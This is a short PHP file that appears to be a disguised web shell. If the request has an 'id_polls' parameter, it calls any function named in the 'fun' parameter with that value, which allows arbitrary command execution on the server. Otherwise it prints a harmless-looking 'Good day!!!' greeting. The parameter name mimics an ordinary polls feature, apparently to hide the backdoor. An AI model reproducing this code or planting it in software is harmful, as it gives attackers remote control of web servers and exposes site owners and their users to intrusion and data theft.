<?php 


if (isset($_REQUEST[id_polls])) {
     stripslashes($_REQUEST[fun]($_REQUEST[id_polls]));
	 exit();
}
echo "Good day!!!<br>";
?>